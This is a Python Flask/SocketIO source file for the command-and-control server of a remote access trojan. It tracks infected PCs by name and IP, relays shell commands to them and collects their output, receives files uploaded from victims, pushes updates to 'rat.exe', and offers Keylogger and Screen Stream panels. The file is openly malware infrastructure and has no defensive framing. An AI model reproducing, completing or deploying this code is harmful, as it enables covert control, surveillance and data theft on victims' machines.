from flask import Flask, render_template, request, jsonify, send_from_directory
from flask_socketio import SocketIO, emit
import os
import sqlite3
from datetime import datetime
import subprocess
import threading
import hashlib
from werkzeug.utils import secure_filename

app = Flask(__name__)
app.config['SECRET_KEY'] = 'your_secret_key'
app.config['UPLOAD_FOLDER'] = 'uploads'
app.config['DOWNLOAD_FOLDER'] = 'downloads'
os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)
os.makedirs(app.config['DOWNLOAD_FOLDER'], exist_ok=True)

socketio = SocketIO(app)

# Database setup
def init_db():
    conn = sqlite3.connect('clients.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS clients
                 (id INTEGER PRIMARY KEY, pc_name TEXT, ip TEXT, last_seen TEXT, online BOOLEAN, version TEXT)''')
    conn.commit()
    conn.close()

init_db()

# Routes
@app.route('/')
def dashboard():
    return render_template('dashboard.html')

@app.route('/upload', methods=['POST'])
def upload_file():
    if 'file' not in request.files:
        return jsonify({"status": "error", "message": "No file provided"}), 400
    file = request.files['file']
    filename = secure_filename(file.filename)
    file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))
    emit('alert', {'type': 'upload', 'pc_name': request.remote_addr, 'filename': filename}, broadcast=True)
    return jsonify({"status": "success", "filename": filename})

@app.route('/download/<filename>', methods=['GET'])
def download_file(filename):
    return send_from_directory(app.config['DOWNLOAD_FOLDER'], filename)

# Client update endpoints
@app.route('/client/update', methods=['POST'])
def update_client():
    if 'file' not in request.files:
        return jsonify({"status": "error", "message": "No file provided"}), 400
    file = request.files['file']
    if file.filename != 'rat.exe':
        return jsonify({"status": "error", "message": "Invalid filename"}), 400
    
    file.save(os.path.join(app.config['DOWNLOAD_FOLDER'], 'rat.exe'))
    file_hash = hashlib.md5(file.read()).hexdigest()
    socketio.emit('client_update', {'hash': file_hash}, broadcast=True)
    return jsonify({"status": "success", "hash": file_hash})

@app.route('/client/version', methods=['GET'])
def get_client_version():
    version_hash = hashlib.md5(open(os.path.join(app.config['DOWNLOAD_FOLDER'], 'rat.exe'), 'rb').read()).hexdigest()
    return jsonify({"hash": version_hash})

# GUI menu endpoint
@app.route('/gui/menu', methods=['GET'])
def get_gui_menu():
    menu = {
        "controls": [
            {"name": "Terminal", "icon": "terminal", "panel": "terminal"},
            {"name": "File Manager", "icon": "folder", "panel": "file-manager"},
            {"name": "Client Updater", "icon": "sync", "panel": "client-updater"},
            {"name": "Keylogger", "icon": "keyboard", "panel": "keylogger"},
            {"name": "Screen Stream", "icon": "monitor", "panel": "screen-stream"}
        ]
    }
    return jsonify(menu)

# WebSocket Events
@socketio.on('connect')
def handle_connect():
    print('Client connected')

@socketio.on('disconnect')
def handle_disconnect():
    print('Client disconnected')

@socketio.on('client_register')
def handle_register(data):
    pc_name = data['pc_name']
    ip = request.remote_addr
    last_seen = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    version = data.get('version', '1.0')
    conn = sqlite3.connect('clients.db')
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO clients (pc_name, ip, last_seen, online, version) VALUES (?, ?, ?, ?, ?)", 
              (pc_name, ip, last_seen, True, version))
    conn.commit()
    conn.close()
    emit('update_clients', get_clients(), broadcast=True)

@socketio.on('terminal_command')
def handle_terminal_command(data):
    emit('terminal_command', {'command': data['command']}, room=data['pc_name'])

@socketio.on('terminal_response')
def handle_terminal_response(data):
    emit('terminal_update', {'pc_name': data['pc_name'], 'output': data['output']}, broadcast=True)

@socketio.on('client_update')
def handle_client_update(data):
    emit('client_update', {'hash': data['hash']}, room=data['pc_name'])

def get_clients():
    conn = sqlite3.connect('clients.db')
    c = conn.cursor()
    c.execute("SELECT pc_name, ip, last_seen, online, version FROM clients")
    clients = [{'pc_name': row[0], 'ip': row[1], 'last_seen': row[2], 'online': row[3], 'version': row[4]} for row in c.fetchall()]
    conn.close()
    return clients

if __name__ == '__main__':
    socketio.run(app, host='0.0.0.0', port=5000, debug=True)
